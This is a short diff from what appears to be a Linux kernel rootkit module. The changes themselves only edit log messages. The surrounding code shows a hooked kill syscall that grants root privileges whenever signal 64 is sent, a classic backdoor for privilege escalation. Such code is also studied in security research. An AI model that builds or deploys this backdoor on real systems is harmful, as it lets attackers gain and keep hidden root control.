@@ -129,7 +129,7 @@ void give_root(void) {
 /* Hacked Syscalls */
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage long hacked_kill(const struct pt_regs *regs) {
-    printk(KERN_WARNING "%s module: Called syscall kill", MODULE_NAME);
+    printk(KERN_WARNING "%s module: Called syscall kill using new pt_regs", MODULE_NAME);
     
     pid_t pid = regs->di;
     int sig = regs->si;
@@ -149,7 +149,7 @@ asmlinkage long hacked_kill(int pid, int sig) {
 
     //struct task_struct *task;
     if(sig == 64) {
-        printk(KERN_INFO "%s module: Giving root\n", MODULE_NAME);
+        printk(KERN_INFO "%s module: Giving root using old asmlinkage\n", MODULE_NAME);
         give_root(); 
 
         return 0;
